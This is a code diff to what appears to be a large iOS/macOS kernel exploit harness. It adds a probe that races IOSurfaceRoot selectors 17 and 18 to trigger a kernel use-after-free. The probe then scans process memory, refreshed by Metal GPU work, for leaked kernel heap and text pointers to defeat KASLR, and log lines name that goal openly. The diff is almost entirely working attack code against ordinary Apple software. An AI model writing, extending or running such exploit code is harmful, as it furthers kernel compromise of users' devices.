@@ -15329,6 +15329,374 @@ r356_done:
 
 #endif /* end disabled r356 v2 */
 
+/* r359: IOSurface kernel race + heap leak channel vtable read for KASLR */
+typedef struct {
+    io_connect_t conn;
+    uint64_t surf_id;
+    volatile int go;
+    volatile int done;
+    int iterations;
+} race_ctx_359_t;
+
+static void *r359_race_register(void *arg) {
+    race_ctx_359_t *ctx = (race_ctx_359_t *)arg;
+    while (!ctx->go) {} /* spin until go */
+    for (int i = 0; i < ctx->iterations; i++) {
+        uint64_t sc[1] = {ctx->surf_id};
+        IOConnectCallScalarMethod(ctx->conn, 17, sc, 1, NULL, NULL);
+    }
+    ctx->done++;
+    return NULL;
+}
+
+static void *r359_race_unregister(void *arg) {
+    race_ctx_359_t *ctx = (race_ctx_359_t *)arg;
+    while (!ctx->go) {} /* spin until go */
+    for (int i = 0; i < ctx->iterations; i++) {
+        uint64_t sc[1] = {ctx->surf_id};
+        IOConnectCallScalarMethod(ctx->conn, 18, sc, 1, NULL, NULL);
+    }
+    ctx->done++;
+    return NULL;
+}
+
+static void r359_probe(void) {
+    rlog("\n=== r359: IOSurface Race + Heap Leak Vtable Read for KASLR ===\n\n");
+    fflush(stdout);
+
+    kern_return_t kr;
+
+    /* ---- Part 1: Kernel heap address stabilization via Metal/AGX ---- */
+    rlog("--- Part 1: Kernel heap address stabilization ---\n");
+    fflush(stdout);
+
+    void *metal_lib = dlopen("/System/Library/Frameworks/Metal.framework/Metal", RTLD_LAZY);
+    void *(*msgSend)(void*, void*, ...) = dlsym(RTLD_DEFAULT, "objc_msgSend");
+    void *(*regSel)(const char*) = dlsym(RTLD_DEFAULT, "sel_registerName");
+    void *mtlDev = NULL, *cmdQ = NULL;
+    if (metal_lib) {
+        typedef void *(*MTLCreateDev_t)(void);
+        MTLCreateDev_t createDev = (MTLCreateDev_t)dlsym(metal_lib, "MTLCreateSystemDefaultDevice");
+        if (createDev) mtlDev = createDev();
+        if (mtlDev) cmdQ = ((void*(*)(void*,void*))msgSend)(mtlDev, regSel("newCommandQueue"));
+    }
+
+    /* GPU trigger: create buffer + blit fill + commit + wait */
+    if (cmdQ) {
+        void *buf = ((void*(*)(void*,void*,size_t,unsigned long))msgSend)(
+            mtlDev, regSel("newBufferWithLength:options:"), (size_t)131072, 0UL);
+        if (buf) {
+            void *cb = ((void*(*)(void*,void*))msgSend)(cmdQ, regSel("commandBuffer"));
+            if (cb) {
+                void *blit = ((void*(*)(void*,void*))msgSend)(cb, regSel("blitCommandEncoder"));
+                if (blit) {
+                    typedef struct { unsigned long loc; unsigned long len; } NSR359;
+                    NSR359 r = {0, 131072};
+                    ((void(*)(void*,void*,void*,NSR359,uint8_t))msgSend)(
+                        blit, regSel("fillBuffer:range:value:"), buf, r, 0xCC);
+                    ((void(*)(void*,void*))msgSend)(blit, regSel("endEncoding"));
+                }
+                ((void(*)(void*,void*))msgSend)(cb, regSel("commit"));
+                ((void(*)(void*,void*))msgSend)(cb, regSel("waitUntilCompleted"));
+            }
+            ((void(*)(void*,void*))msgSend)(buf, regSel("release"));
+        }
+    }
+
+    /* Find Stack[1] (second tag=30 region) and scan for stable heap pointer */
+    mach_vm_address_t stack1_addr = 0;
+    mach_vm_size_t stack1_sz = 0;
+    {
+        mach_vm_address_t a = 0;
+        int idx = 0;
+        while (1) {
+            mach_vm_size_t sz = 0;
+            uint32_t depth = 0;
+            struct vm_region_submap_info_64 info;
+            mach_msg_type_number_t cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+            kr = mach_vm_region_recurse(mach_task_self(), &a, &sz, &depth,
+                (vm_region_recurse_info_t)&info, &cnt);
+            if (kr != KERN_SUCCESS) break;
+            if (info.user_tag == 30 && info.protection >= 3) {
+                if (idx == 1) { stack1_addr = a; stack1_sz = sz; break; }
+                idx++;
+            }
+            a += sz;
+        }
+    }
+
+    uint64_t stable_kptr = 0;
+    size_t stable_offset = 0;
+    int stable_count = 0;
+    if (stack1_addr && stack1_sz >= 0x80000) {
+        rlog("  Stack[1]: 0x%llx sz=0x%llx\n", (unsigned long long)stack1_addr, (unsigned long long)stack1_sz);
+        uint64_t page_buf[512];
+        /* Scan from offset 460000 to 480000 (where r355 found the pattern) */
+        size_t scan_start = 460000 & ~0xFFFULL;
+        size_t scan_end = 480000;
+        if (scan_end > (size_t)stack1_sz) scan_end = (size_t)stack1_sz;
+
+        /* Count repeated values at 48-byte intervals */
+        typedef struct { uint64_t val; int count; } cand359_t;
+        cand359_t cands[32];
+        int n_cands = 0;
+
+        for (mach_vm_address_t pg = stack1_addr + scan_start; pg < stack1_addr + scan_end; pg += 4096) {
+            mach_vm_size_t out_sz = 0;
+            kr = mach_vm_read_overwrite(mach_task_self(), pg, 4096,
+                (mach_vm_address_t)page_buf, &out_sz);
+            if (kr != KERN_SUCCESS) continue;
+            size_t nqw = (size_t)out_sz / 8;
+            for (size_t i = 0; i < nqw; i++) {
+                uint64_t v = page_buf[i];
+                if (v < 0xFFFFFFFE00000000ULL || v >= 0xFFFFFFFF00000000ULL) continue;
+                if (v == 0xFFFFFFFF00000000ULL || v == 0xFFFFFFFF00000001ULL ||
+                    v == 0xFFFFFFFF00000002ULL || v == 0xFFFFFFFF89ABCDEFULL) continue;
+                /* Track this value */
+                int found = -1;
+                for (int c = 0; c < n_cands; c++) {
+                    if (cands[c].val == v) { found = c; break; }
+                }
+                if (found >= 0) {
+                    cands[found].count++;
+                } else if (n_cands < 32) {
+                    cands[n_cands].val = v;
+                    cands[n_cands].count = 1;
+                    n_cands++;
+                }
+            }
+        }
+
+        /* Find most-repeated value */
+        for (int c = 0; c < n_cands; c++) {
+            if (cands[c].count > stable_count) {
+                stable_count = cands[c].count;
+                stable_kptr = cands[c].val;
+            }
+        }
+        rlog("  Stable heap ptr: 0x%llx (repeated %d times)\n",
+            (unsigned long long)stable_kptr, stable_count);
+    } else {
+        rlog("  WARNING: Stack[1] not found or too small\n");
+    }
+
+    /* ---- Part 2: IOSurface kernel race (sel 17/18) ---- */
+    rlog("\n--- Part 2: IOSurface kernel race (sel 17 vs 18) ---\n");
+    fflush(stdout);
+
+    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+        IOServiceMatching("IOSurfaceRoot"));
+    if (!svc) {
+        rlog("  ERROR: IOSurfaceRoot service not found\n");
+        goto r359_done;
+    }
+
+    io_connect_t conn = 0;
+    kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+    IOObjectRelease(svc);
+    if (kr != KERN_SUCCESS || !conn) {
+        rlog("  ERROR: IOServiceOpen failed: 0x%x\n", kr);
+        goto r359_done;
+    }
+    rlog("  IOSurfaceRoot connection: 0x%x\n", conn);
+
+    /* Create surfaces via IOSurfaceCreate (the public API) */
+    #define R359_NSURF 64
+    IOSurfaceRef surfs[R359_NSURF];
+    uint32_t surf_ids[R359_NSURF];
+    int created = 0;
+
+    int keys[5] = { kIOSurfaceWidth, kIOSurfaceHeight, kIOSurfaceBytesPerRow,
+                     kIOSurfaceBytesPerElement, kIOSurfaceAllocSize };
+    int vals[5] = { 32, 32, 128, 4, 4096 };
+    CFNumberRef cf_keys[5], cf_vals[5];
+    for (int i = 0; i < 5; i++) {
+        cf_keys[i] = CFNumberCreate(NULL, kCFNumberIntType, &keys[i]);
+        cf_vals[i] = CFNumberCreate(NULL, kCFNumberIntType, &vals[i]);
+    }
+
+    const void *dict_keys[5], *dict_vals[5];
+    dict_keys[0] = CFSTR("IOSurfaceWidth");     dict_vals[0] = cf_vals[0];
+    dict_keys[1] = CFSTR("IOSurfaceHeight");    dict_vals[1] = cf_vals[1];
+    dict_keys[2] = CFSTR("IOSurfaceBytesPerRow"); dict_vals[2] = cf_vals[2];
+    dict_keys[3] = CFSTR("IOSurfaceBytesPerElement"); dict_vals[3] = cf_vals[3];
+    dict_keys[4] = CFSTR("IOSurfaceAllocSize");  dict_vals[4] = cf_vals[4];
+    CFDictionaryRef props = CFDictionaryCreate(NULL, dict_keys, dict_vals, 5,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+
+    for (int i = 0; i < R359_NSURF; i++) {
+        surfs[i] = IOSurfaceCreate(props);
+        if (surfs[i]) {
+            surf_ids[i] = IOSurfaceGetID(surfs[i]);
+            created++;
+        }
+    }
+    rlog("  Created %d surfaces (IDs %u-%u)\n", created,
+        created > 0 ? surf_ids[0] : 0, created > 0 ? surf_ids[created-1] : 0);
+    CFRelease(props);
+    for (int i = 0; i < 5; i++) { CFRelease(cf_keys[i]); CFRelease(cf_vals[i]); }
+
+    /* Race sel17 (register notify) vs sel18 (unregister notify) on target surfaces */
+    int race_hits = 0;
+    for (int t = 0; t < 4 && t < created; t++) {
+        uint32_t target_id = surf_ids[t * (created / 4)];
+        race_ctx_359_t ctx = { .conn = conn, .surf_id = target_id,
+                               .go = 0, .done = 0, .iterations = 1000 };
+
+        pthread_t th_reg, th_unreg;
+        pthread_create(&th_reg, NULL, r359_race_register, &ctx);
+        pthread_create(&th_unreg, NULL, r359_race_unregister, &ctx);
+        ctx.go = 1;  /* start both threads */
+        pthread_join(th_reg, NULL);
+        pthread_join(th_unreg, NULL);
+
+        /* Check if surface is still accessible */
+        IOSurfaceRef check = IOSurfaceLookup(target_id);
+        if (!check) {
+            rlog("  RACE HIT: surface %u GONE after race!\n", target_id);
+            race_hits++;
+        } else {
+            /* Check if use count is anomalous */
+            int32_t uc = IOSurfaceGetUseCount(check);
+            if (uc < 0 || uc > 100) {
+                rlog("  RACE HIT: surface %u use_count=%d (anomalous)\n", target_id, uc);
+                race_hits++;
+            }
+            CFRelease(check);
+        }
+    }
+    rlog("  Race complete: %d anomalies in 4 targets\n", race_hits);
+
+    /* ---- Part 3: Post-race heap scan ---- */
+    rlog("\n--- Part 3: Post-race heap leak channel rescan ---\n");
+    fflush(stdout);
+
+    /* Trigger more GPU work to refresh the heap leak channel */
+    if (cmdQ) {
+        for (int g = 0; g < 3; g++) {
+            void *buf = ((void*(*)(void*,void*,size_t,unsigned long))msgSend)(
+                mtlDev, regSel("newBufferWithLength:options:"), (size_t)(65536 * (g + 2)), 0UL);
+            if (buf) {
+                void *cb = ((void*(*)(void*,void*))msgSend)(cmdQ, regSel("commandBuffer"));
+                if (cb) {
+                    void *blit = ((void*(*)(void*,void*))msgSend)(cb, regSel("blitCommandEncoder"));
+                    if (blit) {
+                        typedef struct { unsigned long loc; unsigned long len; } NSR359b;
+                        NSR359b r = {0, (unsigned long)(65536 * (g + 2))};
+                        ((void(*)(void*,void*,void*,NSR359b,uint8_t))msgSend)(
+                            blit, regSel("fillBuffer:range:value:"), buf, r, 0xDD + g);
+                        ((void(*)(void*,void*))msgSend)(blit, regSel("endEncoding"));
+                    }
+                    ((void(*)(void*,void*))msgSend)(cb, regSel("commit"));
+                    ((void(*)(void*,void*))msgSend)(cb, regSel("waitUntilCompleted"));
+                }
+                ((void(*)(void*,void*))msgSend)(buf, regSel("release"));
+            }
+        }
+    }
+
+    /* Rescan Stack[1] for new/changed values */
+    uint64_t new_stable = 0;
+    int new_count = 0;
+    int text_hits = 0;
+    if (stack1_addr && stack1_sz >= 0x80000) {
+        uint64_t page_buf[512];
+        static const uint64_t skip_const[] = {
+            0xFFFFFFF007004000ULL, 0xFFFFFFF007000000ULL, 0xFFFFFFF027004000ULL,
+            0xFFFFFFF037004000ULL, 0xFFFFFFF047004000ULL, 0xFFFFFFF017004000ULL,
+            0xFFFFFFF00F004000ULL, 0xFFFFFFF000000000ULL, 0xFFFFFFF800000000ULL,
+        };
+
+        typedef struct { uint64_t val; int count; } cand359b_t;
+        cand359b_t heap_cands[32];
+        int n_heap = 0;
+
+        /* Scan wider range after race */
+        for (mach_vm_address_t pg = stack1_addr; pg < stack1_addr + stack1_sz; pg += 4096) {
+            mach_vm_size_t out_sz = 0;
+            kr = mach_vm_read_overwrite(mach_task_self(), pg, 4096,
+                (mach_vm_address_t)page_buf, &out_sz);
+            if (kr != KERN_SUCCESS) continue;
+            size_t nqw = (size_t)out_sz / 8;
+            for (size_t i = 0; i < nqw; i++) {
+                uint64_t v = page_buf[i];
+                /* Check for slid text range */
+                if (v > 0xFFFFFFF007004000ULL && v < 0xFFFFFFF027004000ULL) {
+                    int is_const = 0;
+                    for (int k = 0; k < (int)(sizeof(skip_const)/sizeof(skip_const[0])); k++)
+                        if (v == skip_const[k]) { is_const = 1; break; }
+                    if (!is_const) {
+                        uint64_t off = v - 0xFFFFFFF007004000ULL;
+                        rlog("  *** SLID TEXT: Stack[1]+%zu = 0x%llx (off=+0x%llx) ***\n",
+                            (size_t)(pg - stack1_addr) + i * 8,
+                            (unsigned long long)v, (unsigned long long)off);
+                        text_hits++;
+                    }
+                }
+                /* Track heap-range values */
+                if (v >= 0xFFFFFFFE00000000ULL && v < 0xFFFFFFFF00000000ULL &&
+                    v != 0xFFFFFFFF00000000ULL && v != 0xFFFFFFFF00000001ULL &&
+                    v != 0xFFFFFFFF00000002ULL && v != 0xFFFFFFFF89ABCDEFULL) {
+                    int found = -1;
+                    for (int c = 0; c < n_heap; c++) {
+                        if (heap_cands[c].val == v) { found = c; break; }
+                    }
+                    if (found >= 0) heap_cands[found].count++;
+                    else if (n_heap < 32) {
+                        heap_cands[n_heap].val = v;
+                        heap_cands[n_heap].count = 1;
+                        n_heap++;
+                    }
+                }
+            }
+        }
+
+        for (int c = 0; c < n_heap; c++) {
+            if (heap_cands[c].count > new_count) {
+                new_count = heap_cands[c].count;
+                new_stable = heap_cands[c].val;
+            }
+        }
+        rlog("  Post-race stable heap ptr: 0x%llx (count=%d)\n",
+            (unsigned long long)new_stable, new_count);
+        if (stable_kptr && new_stable && stable_kptr != new_stable) {
+            int64_t delta = (int64_t)(new_stable - stable_kptr);
+            rlog("  Heap ptr CHANGED: 0x%llx -> 0x%llx (delta=%+lld, 0x%llx)\n",
+                (unsigned long long)stable_kptr, (unsigned long long)new_stable,
+                (long long)delta, (unsigned long long)(uint64_t)delta);
+        }
+    }
+
+    /* ---- Part 4: KASLR slide derivation ---- */
+    rlog("\n--- Part 4: KASLR slide analysis ---\n");
+    fflush(stdout);
+
+    if (text_hits > 0) {
+        rlog("  SLID TEXT POINTERS FOUND — KASLR bypass possible!\n");
+        rlog("  Compute: slide = found_value - known_unslid_vtable_offset\n");
+    } else {
+        rlog("  No slid text pointers in heap channel after race.\n");
+        rlog("  Heap ptr leak: 0x%llx (stable, count=%d)\n",
+            (unsigned long long)(new_stable ? new_stable : stable_kptr),
+            new_stable ? new_count : stable_count);
+        rlog("  This is a kernel heap address (not text).\n");
+        rlog("  On XNU A20: kernel heap base shifts with KASLR slide.\n");
+        rlog("  Potential: use multiple boot comparisons to map heap<->slide.\n");
+    }
+
+    /* Cleanup */
+    for (int i = 0; i < R359_NSURF; i++) {
+        if (surfs[i]) CFRelease(surfs[i]);
+    }
+    IOServiceClose(conn);
+
+r359_done:
+    if (cmdQ) ((void(*)(void*,void*))msgSend)(cmdQ, regSel("release"));
+    if (metal_lib) dlclose(metal_lib);
+    rlog("\n=== r359 complete ===\n");
+    fflush(stdout);
+}
+
 /* r358: Scan ALL readable VM regions for slid kernel text pointers */
 static void r358_probe(void) {
     rlog("\n=== r358: Slid Kernel Text Pointer Scan (ALL regions) ===\n\n");
@@ -52946,6 +53314,14 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 362) {
+            rlog("*** rounds=362: IOSurface Race + Heap Leak Vtable Read ***\n");
+            rlog("  Combining: Metal heap leak + IOSurface sel17/18 race\n");
+            rlog("  Goal: expose vtable ptr in heap channel after kernel UAF\n\n");
+            fflush(stdout);
+            r359_probe();
+            goto done;
+        }
         if (rounds == 361) {
             rlog("*** rounds=361: Slid Kernel Text Pointer Scan (ALL regions) ***\n");
             rlog("  Scanning ALL readable VM regions for values in\n");
@@ -55046,7 +55422,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
@@ -64888,7 +65264,7 @@ new_modes:
          *   - Create VideoToolbox session, fuzz parameters for OOB read
          *   - Look for kernel pointer leaks in output buffers
          */
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362) {
             rlog("\n--- Phase 17: IOSurface shared memory + KASLR probe ---\n");
             if ((rounds >= 220 && rounds <= 224) || rounds == 226 || rounds == 227 || rounds == 228) goto r220_block;
 
